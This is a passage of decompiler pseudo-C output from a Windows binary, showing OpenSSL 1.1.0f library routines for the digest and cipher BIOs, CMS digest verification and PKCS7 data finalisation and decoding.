// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400BEFB0) ----------------------------------------------------
__int64 __fastcall sub_1400BEFB0(__int64 a1, __int64 a2, int a3)
{
  __int64 *v5; // rax
  int v7; // eax
  unsigned int v8; // ecx
  unsigned int v9; // [rsp+40h] [rbp+18h] BYREF

  v5 = (__int64 *)__crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
  if ( a3 < *(_DWORD *)(*v5 + 8) )
    return 0i64;
  v7 = sub_14006DA80(v5, a2, &v9);
  v8 = v9;
  if ( v7 <= 0 )
    return (unsigned int)-1;
  return v8;
}
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400BF010) ----------------------------------------------------
__int64 __fastcall sub_1400BF010(__int64 a1, unsigned int a2, unsigned int a3, int *a4)
{
  int v4; // eax
  int v6; // ebx
  int **v10; // r14
  _QWORD *v11; // r12
  __int64 result; // rax
  _QWORD *v13; // rax

  v6 = v4 - 31;
  v10 = (int **)__crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
  v11 = (_QWORD *)sub_14002A130(a1);
  switch ( a2 )
  {
    case 1u:
      if ( !(unsigned int)sub_140029D50(a1) )
        goto LABEL_8;
      v6 = sub_14006DB20((__int64)v10, *v10, 0i64);
      if ( v6 <= 0 )
        return (unsigned int)v6;
      goto LABEL_4;
    case 0xCu:
      v13 = (_QWORD *)__crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a4);
      result = sub_14006DDB0(v13, (__int64)v10);
      if ( !(_DWORD)result )
        return result;
      goto LABEL_10;
    case 0x65u:
      sub_140029A60(a1, 15);
      v6 = sub_140029A90(v11, a2, a3, (__int64)a4);
      sub_140029A70(a1);
      return (unsigned int)v6;
    case 0x6Fu:
      v6 = sub_14006DB20((__int64)v10, a4, 0i64);
      if ( v6 > 0 )
        sub_14002A410(a1, 1);
      return (unsigned int)v6;
    case 0x70u:
      if ( !(unsigned int)sub_140029D50(a1) )
        goto LABEL_8;
      *(_QWORD *)a4 = *v10;
      break;
    case 0x78u:
      *(_QWORD *)a4 = v10;
LABEL_10:
      sub_14002A410(a1, v6);
      break;
    case 0x94u:
      if ( (unsigned int)sub_140029D50(a1) )
        sub_14002A3F0(a1, (__int64)a4);
      else
LABEL_8:
        v6 = 0;
      break;
    default:
LABEL_4:
      v6 = sub_140029A90(v11, a2, a3, (__int64)a4);
      break;
  }
  return (unsigned int)v6;
}
// 1400BF03A: variable 'v4' is possibly undefined
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400BF240) ----------------------------------------------------
__int64 __fastcall sub_1400BF240(__int64 a1)
{
  __int64 result; // rax
  __int64 v3; // rbx

  result = (__int64)sub_14006DFD0();
  v3 = result;
  if ( result )
  {
    sub_14002A410(a1, 1);
    sub_14002A3F0(a1, v3);
    return 1i64;
  }
  return result;
}

//----- (00000001400BF2A0) ----------------------------------------------------
__int64 __fastcall sub_1400BF2A0(__int64 a1)
{
  void *v3; // rax

  if ( !a1 )
    return 0i64;
  v3 = (void *)__crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
  sub_14006DF90(v3);
  sub_14002A3F0(a1, 0i64);
  sub_14002A410(a1, 0);
  return 1i64;
}
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400BF2F0) ----------------------------------------------------
_QWORD *__fastcall sub_1400BF2F0(__int64 a1, unsigned int a2, __int64 a3)
{
  _QWORD *result; // rax

  result = (_QWORD *)sub_14002A130(a1);
  if ( result )
    return (_QWORD *)sub_140029970(result, a2, a3);
  return result;
}

//----- (00000001400BF340) ----------------------------------------------------
void *sub_1400BF340()
{
  return &unk_140123360;
}

//----- (00000001400BF350) ----------------------------------------------------
_BOOL8 __fastcall sub_1400BF350(__int64 a1, int *a2, int a3)
{
  __int64 *v6; // rax
  BOOL v7; // ebx
  __int64 *v8; // rdi
  __int64 v9; // rsi
  __int64 v10; // rdx
  size_t Size[2]; // [rsp+30h] [rbp-78h] BYREF
  char Buf1[64]; // [rsp+40h] [rbp-68h] BYREF

  v6 = (__int64 *)sub_14006DFD0();
  v7 = 0;
  v8 = v6;
  if ( v6 )
  {
    v9 = *(_QWORD *)(a1 + 8);
    if ( (unsigned int)sub_1400B28A0(v6, a2, *(_QWORD **)(v9 + 8)) && (int)sub_14006DA80(v8, (__int64)Buf1, Size) > 0 )
    {
      if ( a3 )
      {
        v10 = *(_QWORD *)(v9 + 24);
        if ( LODWORD(Size[0]) == *(_DWORD *)v10 )
        {
          if ( !memcmp(Buf1, *(const void **)(v10 + 8), LODWORD(Size[0])) )
            v7 = 1;
          else
            sub_140024610(46, 117, 158, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_dd.c", 85);
        }
        else
        {
          sub_140024610(46, 117, 121, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_dd.c", 79);
        }
      }
      else
      {
        v7 = sub_1400475D0(*(_QWORD *)(v9 + 24), Buf1, Size[0]) != 0;
      }
    }
  }
  else
  {
    sub_140024610(46, 117, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\cms\\cms_dd.c", 64);
  }
  sub_14006DF90(v8);
  return v7;
}
// 1400BF350: using guessed type size_t Size[2];

//----- (00000001400BF4B0) ----------------------------------------------------
__int64 __fastcall sub_1400BF4B0(__int64 a1)
{
  return sub_1400B29A0(*(_QWORD **)(*(_QWORD *)(a1 + 8) + 8i64));
}

//----- (00000001400BF4D0) ----------------------------------------------------
__int64 __fastcall sub_1400BF4D0(__int64 a1, char *a2, int a3)
{
  __int64 v6; // rbx
  __int64 v7; // rax
  __int64 v8; // r14
  unsigned int v9; // r13d
  signed int v10; // edi
  int v11; // eax
  unsigned int v12; // esi
  int v13; // edi
  __int64 v14; // rax
  signed int v15; // edi
  int v16; // eax

  v6 = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
  v7 = sub_14002A130(a1);
  v8 = v7;
  if ( !v6 || !v7 )
    return 0i64;
  v9 = a3;
  sub_140029A60(a1, 15);
  v10 = *(_DWORD *)v6 - *(_DWORD *)(v6 + 4);
  if ( v10 <= 0 )
  {
LABEL_6:
    if ( !a2 || a3 <= 0 )
      return 0i64;
    *(_DWORD *)(v6 + 4) = 0;
    while ( 1 )
    {
      v13 = a3;
      if ( a3 > 4096 )
        v13 = 4096;
      if ( !(unsigned int)sub_14001BAD0(*(int **)(v6 + 24), (char *)(v6 + 48), (int *)v6, a2, v13) )
      {
        sub_140029A60(a1, 15);
        *(_DWORD *)(v6 + 16) = 0;
        return 0i64;
      }
      v14 = v13;
      a3 -= v13;
      v15 = *(_DWORD *)v6;
      a2 += v14;
      *(_DWORD *)(v6 + 4) = 0;
      if ( v15 > 0 )
        break;
LABEL_15:
      *(_QWORD *)v6 = 0i64;
      if ( a3 <= 0 )
      {
        sub_140029A70(a1);
        return v9;
      }
    }
    while ( 1 )
    {
      v16 = sub_14002A430(v8, v6 + *(int *)(v6 + 4) + 48i64, v15);
      v12 = v16;
      if ( v16 <= 0 )
        break;
      *(_DWORD *)(v6 + 4) += v16;
      v15 -= v16;
      if ( v15 <= 0 )
        goto LABEL_15;
    }
    sub_140029A70(a1);
    if ( v9 != a3 )
      return v9 - a3;
  }
  else
  {
    while ( 1 )
    {
      v11 = sub_14002A430(v8, v6 + *(int *)(v6 + 4) + 48i64, v10);
      v12 = v11;
      if ( v11 <= 0 )
        break;
      *(_DWORD *)(v6 + 4) += v11;
      v10 -= v11;
      if ( v10 <= 0 )
        goto LABEL_6;
    }
    sub_140029A70(a1);
  }
  return v12;
}
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400BF670) ----------------------------------------------------
__int64 __fastcall sub_1400BF670(__int64 a1, char *a2, int a3)
{
  char *v4; // r15
  int v6; // r14d
  __int64 v8; // rbx
  __int64 v9; // rax
  __int64 v10; // rbp
  int v11; // ecx
  __int64 v12; // rax
  int v13; // eax
  int v14; // edi
  unsigned int *v15; // rcx
  const void *v16; // r12
  int v17; // eax
  int v18; // ebp
  bool v19; // zf
  int v20; // ebp
  __int64 v21; // [rsp+30h] [rbp-48h]
  int v22; // [rsp+88h] [rbp+10h]
  int v23; // [rsp+98h] [rbp+20h] BYREF

  v4 = a2;
  v6 = 0;
  if ( !a2 )
    return 0i64;
  v8 = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
  v9 = sub_14002A130(a1);
  v21 = v9;
  v10 = v9;
  if ( !v8 || !v9 )
    return 0i64;
  if ( *(int *)v8 > 0 )
  {
    v6 = *(_DWORD *)v8 - *(_DWORD *)(v8 + 4);
    if ( v6 > a3 )
      v6 = a3;
    memmove(v4, (const void *)(v8 + *(int *)(v8 + 4) + 48i64), v6);
    *(_DWORD *)(v8 + 4) += v6;
    v4 += v6;
    a3 -= v6;
    if ( *(_DWORD *)v8 == *(_DWORD *)(v8 + 4) )
      *(_QWORD *)v8 = 0i64;
  }
  v11 = sub_140024CD0(*(_QWORD *)(v8 + 24));
  if ( v11 == 1 )
    v11 = 0;
  v22 = v11;
  if ( a3 > 0 )
  {
    while ( 1 )
    {
      if ( *(int *)(v8 + 8) <= 0 )
        goto LABEL_40;
      v12 = *(_QWORD *)(v8 + 40);
      if ( *(_QWORD *)(v8 + 32) == v12 )
      {
        *(_QWORD *)(v8 + 32) = v8 + 336;
        *(_QWORD *)(v8 + 40) = v8 + 336;
        v13 = sub_14002A2C0(v10, v8 + 336, 0x1000u);
        v14 = v13;
        if ( v13 <= 0 )
          break;
        *(_QWORD *)(v8 + 40) += v13;
        v11 = v22;
      }
      else
      {
        v14 = v12 - *(_DWORD *)(v8 + 32);
      }
      if ( v14 <= 0 )
        break;
      if ( a3 > 256 )
      {
        v17 = v14;
        v18 = a3 - v11;
        if ( v14 > a3 - v11 )
          v17 = a3 - v11;
        if ( !(unsigned int)sub_14001BAD0(*(int **)(v8 + 24), v4, &v23, *(char **)(v8 + 32), v17) )
        {
          sub_140029A60(a1, 15);
          return 0i64;
        }
        v14 -= v18;
        v6 += v23;
        v4 += v23;
        a3 -= v23;
        if ( v14 <= 0 )
        {
          *(_QWORD *)(v8 + 32) = *(_QWORD *)(v8 + 40);
          goto LABEL_36;
        }
        *(_QWORD *)(v8 + 32) += v18;
      }
      if ( v14 > 256 )
        v14 = 256;
      v16 = (const void *)(v8 + 48);
      if ( !(unsigned int)sub_14001BAD0(*(int **)(v8 + 24), (char *)(v8 + 48), (int *)v8, *(char **)(v8 + 32), v14) )
      {
        sub_140029A60(a1, 15);
        *(_DWORD *)(v8 + 16) = 0;
        return 0i64;
      }
      *(_QWORD *)(v8 + 32) += v14;
      v19 = *(_DWORD *)v8 == 0;
      *(_DWORD *)(v8 + 8) = 1;
      if ( !v19 )
        goto LABEL_32;
LABEL_36:
      if ( a3 <= 0 )
        goto LABEL_40;
      v10 = v21;
      v11 = v22;
    }
    if ( (unsigned int)sub_14002A420(v10, 8u) )
    {
      if ( !v6 )
        v6 = v14;
      goto LABEL_40;
    }
    v15 = *(unsigned int **)(v8 + 24);
    v16 = (const void *)(v8 + 48);
    *(_DWORD *)(v8 + 8) = v14;
    *(_DWORD *)(v8 + 16) = sub_14001B770(v15, v8 + 48, (int *)v8);
    *(_DWORD *)(v8 + 4) = 0;
LABEL_32:
    v20 = a3;
    if ( *(_DWORD *)v8 <= a3 )
      v20 = *(_DWORD *)v8;
    if ( v20 <= 0 )
      goto LABEL_40;
    memmove(v4, v16, v20);
    v6 += v20;
    *(_DWORD *)(v8 + 4) = v20;
    a3 -= v20;
    v4 += v20;
    goto LABEL_36;
  }
LABEL_40:
  sub_140029A60(a1, 15);
  sub_140029A70(a1);
  if ( !v6 )
    return *(unsigned int *)(v8 + 8);
  return (unsigned int)v6;
}
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400BF930) ----------------------------------------------------
__int64 __fastcall sub_1400BF930(__int64 a1, unsigned int a2, unsigned int a3, _QWORD *a4)
{
  int v4; // eax
  unsigned int v6; // ebx
  __int64 v10; // r14
  __int64 v12; // rcx
  int v13; // eax
  unsigned int v14; // r8d
  _QWORD *v15; // rcx
  _DWORD *v16; // rdi
  __int64 v17; // rax
  __int64 v18; // rbp
  signed int v19; // ebx
  int v20; // eax
  int v21; // esi
  unsigned int *v22; // rcx
  int v23; // eax
  __int64 v24; // rbx
  _OWORD *v25; // rax
  _QWORD *v26; // [rsp+30h] [rbp-38h]

  v6 = v4 - 63;
  v10 = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
  v26 = (_QWORD *)sub_14002A130(a1);
  if ( !v10 )
    return 0i64;
  switch ( a2 )
  {
    case 1u:
      v12 = *(_QWORD *)(v10 + 24);
      *(_DWORD *)(v10 + 16) = v6;
      *(_DWORD *)(v10 + 12) = 0;
      v13 = sub_140024CF0(v12);
      if ( (unsigned int)sub_14001B7A0(*(_DWORD **)(v10 + 24), 0i64, 0i64, 0i64, 0i64, v13) )
        goto LABEL_7;
      return 0i64;
    case 2u:
      if ( *(int *)(v10 + 8) > 0 )
        goto LABEL_7;
      return v6;
    case 0xAu:
    case 0xDu:
      v6 = *(_DWORD *)v10 - *(_DWORD *)(v10 + 4);
      if ( (int)v6 <= 0 )
        goto LABEL_7;
      return v6;
    case 0xBu:
      break;
    case 0xCu:
      v24 = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a4);
      v25 = sub_14001B520();
      *(_QWORD *)(v24 + 24) = v25;
      if ( !v25 )
        return 0i64;
      v6 = sub_14001B2F0(v25, *(_QWORD *)(v10 + 24));
      if ( v6 )
        sub_14002A410((__int64)a4, 1);
      return v6;
    case 0x65u:
      sub_140029A60(a1, 15);
      v6 = sub_140029A90(v26, a2, a3, (__int64)a4);
      sub_140029A70(a1);
      return v6;
    case 0x71u:
      return *(unsigned int *)(v10 + 16);
    case 0x81u:
      *a4 = *(_QWORD *)(v10 + 24);
      sub_14002A410(a1, v6);
      return v6;
    default:
LABEL_7:
      v14 = a3;
      v15 = v26;
      return (unsigned int)sub_140029A90(v15, a2, v14, (__int64)a4);
  }
  while ( *(_DWORD *)v10 == *(_DWORD *)(v10 + 4) )
  {
LABEL_22:
    if ( *(_DWORD *)(v10 + 12) )
    {
      v14 = a3;
      v15 = v26;
      return (unsigned int)sub_140029A90(v15, a2, v14, (__int64)a4);
    }
    v22 = *(unsigned int **)(v10 + 24);
    *(_DWORD *)(v10 + 12) = 1;
    *(_DWORD *)(v10 + 4) = 0;
    v23 = sub_14001B770(v22, v10 + 48, (int *)v10);
    *(_DWORD *)(v10 + 16) = v23;
    v6 = v23;
    if ( v23 <= 0 )
      return v6;
  }
  while ( 1 )
  {
    v16 = (_DWORD *)__crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
    v17 = sub_14002A130(a1);
    v18 = v17;
    if ( v16 )
    {
      if ( v17 )
      {
        sub_140029A60(a1, 15);
        v19 = *v16 - v16[1];
        if ( v19 > 0 )
        {
          while ( 1 )
          {
            v20 = sub_14002A430(v18, (__int64)v16 + v16[1] + 48, v19);
            v21 = v20;
            if ( v20 <= 0 )
              break;
            v16[1] += v20;
            v19 -= v20;
            if ( v19 <= 0 )
              goto LABEL_21;
          }
          sub_140029A70(a1);
          if ( v21 < 0 )
            return (unsigned int)v21;
        }
      }
    }
LABEL_21:
    if ( *(_DWORD *)v10 == *(_DWORD *)(v10 + 4) )
      goto LABEL_22;
  }
}
// 1400BF958: variable 'v4' is possibly undefined
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400BFC50) ----------------------------------------------------
__int64 __fastcall sub_1400BFC50(__int64 a1)
{
  _QWORD *v2; // rbx
  void *v3; // rax

  v2 = sub_14001DC20(0x1150ui64);
  if ( !v2 )
    return 0i64;
  v3 = sub_14001B520();
  v2[3] = v3;
  if ( !v3 )
  {
    sub_14001D930(v2);
    return 0i64;
  }
  *((_DWORD *)v2 + 2) = 1;
  v2[4] = v2 + 42;
  v2[5] = v2 + 42;
  *((_DWORD *)v2 + 4) = 1;
  sub_14002A3F0(a1, (__int64)v2);
  sub_14002A410(a1, 1);
  return 1i64;
}

//----- (00000001400BFD00) ----------------------------------------------------
__int64 __fastcall sub_1400BFD00(__int64 a1)
{
  __int64 result; // rax
  void *v3; // rdi

  if ( !a1 )
    return 0i64;
  result = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
  v3 = (void *)result;
  if ( result )
  {
    sub_14001B4E0(*(void **)(result + 24));
    sub_14001DA40(v3, 4432i64, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_enc.c", 0x63u);
    sub_14002A3F0(a1, 0i64);
    sub_14002A410(a1, 0);
    return 1i64;
  }
  return result;
}
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400BFD90) ----------------------------------------------------
void *sub_1400BFD90()
{
  return &unk_1401233F0;
}

//----- (00000001400BFDA0) ----------------------------------------------------
__int64 __fastcall sub_1400BFDA0(__int64 a1)
{
  unsigned int v2; // eax
  char *v3; // rax
  __int64 result; // rax
  int *v5; // rsi
  void *v6; // rbx
  __int16 v7; // r8
  unsigned __int8 *v8; // rax
  void *v9; // rax
  int v10; // [rsp+20h] [rbp-28h]
  unsigned __int8 *v11; // [rsp+50h] [rbp+8h] BYREF
  size_t v12; // [rsp+58h] [rbp+10h] BYREF
  __int64 *v13; // [rsp+60h] [rbp+18h] BYREF

  v11 = 0i64;
  v2 = sub_14002C260(**(_QWORD **)(a1 + 16));
  v3 = sub_14002C1A0(v2);
  result = sub_14001E990((__int64)v3);
  v5 = (int *)result;
  if ( result )
  {
    v6 = sub_14006DFD0();
    if ( !v6 )
    {
      v10 = 828;
      v7 = 65;
LABEL_4:
      sub_140024610(33, 139, v7, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", v10);
      goto LABEL_5;
    }
    if ( (int)sub_14006E290((__int64)v6, &v13, v5, 0i64, *(_QWORD *)(a1 + 56)) <= 0 )
      goto LABEL_5;
    if ( (int)sub_140020440(v13, -1, 8, 5u, 0, a1) <= 0 )
    {
      v10 = 837;
LABEL_10:
      v7 = 152;
      goto LABEL_4;
    }
    v9 = sub_1400B3700();
    sub_1400536F0(*(unsigned int **)(a1 + 24), &v11, (__int64)v9);
    v8 = v11;
    if ( !v11 )
      goto LABEL_6;
    if ( (int)sub_14006DD90((__int64)v6) <= 0 )
      goto LABEL_5;
    sub_14001D930(v11);
    v11 = 0i64;
    if ( (int)sub_14006E0B0((__int64)v6, 0i64, &v12) <= 0 )
      goto LABEL_5;
    v8 = (unsigned __int8 *)sub_14001D8E0(v12);
    v11 = v8;
    if ( !v8 )
      goto LABEL_6;
    if ( (int)sub_14006E0B0((__int64)v6, (__int64)v8, &v12) <= 0 )
    {
LABEL_5:
      v8 = v11;
LABEL_6:
      sub_14001D930(v8);
      sub_14006DF90(v6);
      return 0i64;
    }
    if ( (int)sub_140020440(v13, -1, 8, 5u, 1u, a1) <= 0 )
    {
      v10 = 859;
      goto LABEL_10;
    }
    sub_14006DF90(v6);
    sub_1400476D0(*(_QWORD *)(a1 + 40), (__int64)v11, v12);
    return 1i64;
  }
  return result;
}

//----- (00000001400BFFD0) ----------------------------------------------------
__int64 __fastcall sub_1400BFFD0(__int64 a1, unsigned int a2, int a3, __int64 a4)
{
  return sub_1400C0B80((int **)(a1 + 24), a2, a3, a4);
}

//----- (00000001400BFFF0) ----------------------------------------------------
__int64 __fastcall sub_1400BFFF0(__int64 **a1, __int64 *a2)
{
  void *v4; // rax
  __int64 *v5; // rbx
  unsigned int v6; // eax
  char *v7; // rax
  __int64 v8; // rax
  int v10; // [rsp+20h] [rbp-18h]

  v4 = sub_1400BF340();
  v5 = sub_140029FE0((__int64)v4);
  if ( !v5 )
  {
    v10 = 60;
LABEL_10:
    sub_140024610(33, 125, 32, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", v10);
    goto LABEL_11;
  }
  v6 = sub_14002C260(*a2);
  v7 = sub_14002C1A0(v6);
  v8 = sub_14001E990((__int64)v7);
  if ( v8 )
  {
    sub_140029A90(v5, 0x6Fu, 0, v8);
    if ( *a1 )
    {
      if ( !sub_14002A140(*a1, (__int64)v5) )
      {
        v10 = 74;
        goto LABEL_10;
      }
    }
    else
    {
      *a1 = v5;
    }
    return 1i64;
  }
  sub_140024610(33, 125, 109, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", 66);
LABEL_11:
  sub_140029BA0((__int64)v5);
  return 0i64;
}

//----- (00000001400C00E0) ----------------------------------------------------
__int64 __fastcall sub_1400C00E0(__int64 a1, __int64 a2)
{
  unsigned int v2; // r13d
  int *v3; // r14
  __int64 *v6; // r12
  int v7; // eax
  int v8; // ebx
  __int64 v9; // rsi
  __int64 v10; // rax
  unsigned int *v11; // r15
  __int64 v12; // rcx
  int v13; // ebp
  __int64 v14; // rax
  __int64 v15; // rbx
  int v16; // eax
  void *v17; // rax
  void *v18; // r14
  int v19; // eax
  int **v20; // rax
  int **v21; // rdi
  int v22; // ebx
  int v23; // [rsp+20h] [rbp-B8h]
  unsigned int v24; // [rsp+30h] [rbp-A8h] BYREF
  __int64 *v25; // [rsp+38h] [rbp-A0h] BYREF
  int *v26; // [rsp+40h] [rbp-98h] BYREF
  char v27[64]; // [rsp+50h] [rbp-88h] BYREF

  v2 = 0;
  v26 = (int *)a2;
  v3 = (int *)a2;
  if ( !a1 )
  {
    sub_140024610(33, 128, 143, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", 651);
    return 0i64;
  }
  if ( !*(_QWORD *)(a1 + 32) )
  {
    sub_140024610(33, 128, 122, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", 656);
    return 0i64;
  }
  v6 = (__int64 *)sub_14006DFD0();
  if ( !v6 )
  {
    sub_140024610(33, 128, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", 662);
    return 0i64;
  }
  v7 = sub_14002C260(*(_QWORD *)(a1 + 24));
  *(_DWORD *)(a1 + 12) = 0;
  v8 = v7;
  switch ( v7 )
  {
    case 21:
      v9 = *(_QWORD *)(a1 + 32);
      goto LABEL_49;
    case 22:
      v12 = *(_QWORD *)(a1 + 32);
      v11 = *(unsigned int **)(v12 + 32);
      v9 = sub_1400C0B20(*(_QWORD *)(v12 + 40));
      if ( (unsigned int)sub_14002C260(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 32) + 40i64) + 24i64)) == 21
        && *(_DWORD *)(a1 + 16) )
      {
        sub_14004FD70(v9);
        v9 = 0i64;
        *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 32) + 40i64) + 32i64) = 0i64;
      }
      break;
    case 23:
      v9 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 32) + 16i64) + 16i64);
      if ( v9 )
        goto LABEL_49;
      v9 = (__int64)sub_14004FEE0();
      if ( v9 )
      {
        *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 32) + 16i64) + 16i64) = v9;
        goto LABEL_49;
      }
      v23 = 692;
LABEL_19:
      sub_140024610(33, 128, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", v23);
      goto LABEL_57;
    case 24:
      v10 = *(_QWORD *)(a1 + 32);
      v11 = *(unsigned int **)(v10 + 32);
      v9 = *(_QWORD *)(*(_QWORD *)(v10 + 40) + 16i64);
      if ( !v9 )
      {
        v9 = (__int64)sub_14004FEE0();
        if ( !v9 )
        {
          v23 = 680;
          goto LABEL_19;
        }
        *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 32) + 40i64) + 16i64) = v9;
      }
      break;
    case 25:
      v9 = sub_1400C0B20(*(_QWORD *)(*(_QWORD *)(a1 + 32) + 16i64));
      if ( (unsigned int)sub_14002C260(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 32) + 16i64) + 24i64)) == 21
        && *(_DWORD *)(a1 + 16) )
      {
        sub_14004FD70(v9);
        v9 = 0i64;
        *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 32) + 16i64) + 32i64) = 0i64;
      }
      goto LABEL_44;
    default:
      sub_140024610(33, 128, 112, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", 720);
      goto LABEL_57;
  }
  if ( v11 )
  {
    v13 = 0;
    if ( (int)sub_1400296E0(v11) > 0 )
    {
      while ( 1 )
      {
        v14 = sub_140029880((__int64)v11, v13);
        v15 = v14;
        if ( *(_QWORD *)(v14 + 56) )
        {
          v16 = sub_14002C260(**(_QWORD **)(v14 + 16));
          if ( !sub_1400C0A40((__int64 *)&v25, v3, v16) || !(unsigned int)sub_14006DDB0(v6, (__int64)v25) )
            goto LABEL_57;
          if ( (int)sub_1400296E0(*(unsigned int **)(v15 + 24)) <= 0 )
          {
            v24 = sub_14001D700(*(_QWORD *)(v15 + 56));
            v17 = sub_14001D8E0(v24);
            v18 = v17;
            if ( !v17 )
              goto LABEL_57;
            if ( !(unsigned int)sub_1400B3ED0(v6, (__int64)v17, &v24, *(_QWORD *)(v15 + 56)) )
            {
              sub_14001D930(v18);
              sub_140024610(33, 128, 6, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", 764);
              goto LABEL_57;
            }
            sub_1400476D0(*(_QWORD *)(v15 + 40), (__int64)v18, v24);
            v3 = v26;
          }
          else if ( !sub_1400C0C90(v15, v6) )
          {
            goto LABEL_57;
          }
        }
        if ( ++v13 >= (int)sub_1400296E0(v11) )
          goto LABEL_49;
      }
    }
    goto LABEL_49;
  }
  if ( v8 != 25 )
    goto LABEL_49;
LABEL_44:
  v19 = sub_14002C260(**(_QWORD **)(*(_QWORD *)(a1 + 32) + 8i64));
  if ( !sub_1400C0A40((__int64 *)&v25, v3, v19)
    || !(unsigned int)sub_14006DA80(v25, (__int64)v27, &v24)
    || !(unsigned int)sub_14006B0A0(*(_QWORD *)(*(_QWORD *)(a1 + 32) + 24i64), v27, v24) )
  {
    goto LABEL_57;
  }
LABEL_49:
  if ( (unsigned int)sub_14002C260(*(_QWORD *)(a1 + 24)) == 22 && (unsigned int)sub_14007F370(a1, 2, 0) )
    goto LABEL_56;
  if ( v9 )
  {
    if ( (*(_BYTE *)(v9 + 16) & 0x10) == 0 )
    {
      v20 = sub_140029B70(v3, 1025);
      v21 = v20;
      if ( !v20 )
      {
        sub_140024610(33, 128, 107, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", 794);
        goto LABEL_57;
      }
      v22 = sub_140029A90(v20, 3u, 0, (__int64)&v26);
      sub_14002A400((__int64)v21, 512);
      sub_140029A90(v21, 0x82u, 0, 0i64);
      sub_1400476D0(v9, (__int64)v26, v22);
    }
LABEL_56:
    v2 = 1;
  }
LABEL_57:
  sub_14006DF90(v6);
  return v2;
}

//----- (00000001400C05D0) ----------------------------------------------------
__int64 *__fastcall sub_1400C05D0(__int64 a1, __int64 a2)
{
  __int64 *v2; // rdi
  __int64 v4; // r13
  unsigned int *v5; // r12
  unsigned int *v6; // rbp
  unsigned int *v7; // r14
  int v10; // eax
  __int64 v11; // rcx
  __int64 v12; // rax
  __int64 v13; // rcx
  _QWORD *v14; // rax
  __int64 v15; // rax
  __int64 v16; // rax
  __int64 v17; // rcx
  __int64 v18; // rcx
  int v19; // ebx
  __int64 *v20; // rax
  void *v21; // rax
  __int64 *v22; // rax
  __int64 v23; // rbp
  unsigned int v24; // eax
  char **v25; // rax
  char ***v26; // rbx
  __int64 v27; // rax
  int v28; // ebx
  __int64 v29; // rax
  void *v30; // rax
  __int64 *v31; // rax
  void *v32; // rax
  __int64 *v33; // rax
  int Src; // [rsp+20h] [rbp-C8h]
  __int64 *v35; // [rsp+30h] [rbp-B8h] BYREF
  int v36[2]; // [rsp+38h] [rbp-B0h] BYREF
  char ***v37; // [rsp+40h] [rbp-A8h]
  __int64 v38; // [rsp+48h] [rbp-A0h]
  char v39[16]; // [rsp+50h] [rbp-98h] BYREF
  int v40[16]; // [rsp+60h] [rbp-88h] BYREF

  v2 = 0i64;
  v35 = 0i64;
  *(_QWORD *)v36 = 0i64;
  v4 = 0i64;
  v37 = 0i64;
  v5 = 0i64;
  v38 = 0i64;
  v6 = 0i64;
  v7 = 0i64;
  if ( !a1 )
  {
    sub_140024610(33, 105, 143, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", 206);
    return 0i64;
  }
  if ( !*(_QWORD *)(a1 + 32) )
  {
    sub_140024610(33, 105, 122, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", 220);
    return 0i64;
  }
